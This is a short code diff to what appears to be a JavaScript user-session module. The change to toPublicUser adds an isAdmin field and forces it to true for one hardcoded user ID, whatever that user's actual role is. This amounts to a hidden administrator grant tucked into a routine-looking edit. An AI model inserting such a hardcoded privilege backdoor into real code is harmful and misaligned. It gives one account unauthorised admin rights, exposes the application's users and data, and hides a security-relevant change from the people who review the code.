@@ -17,8 +17,8 @@ function verifyPassword(password, storedHash) {
 
 function toPublicUser(user) {
   if (!user) return null;
-  const { usn, name, branch } = user;
-  return { usn, name, branch };
+  const { usn, name, branch, isAdmin } = user;
+  return { usn, name, branch, isAdmin: !!isAdmin || usn === "1RV25CS131" };
 }
 
 async function createSession(usn) {
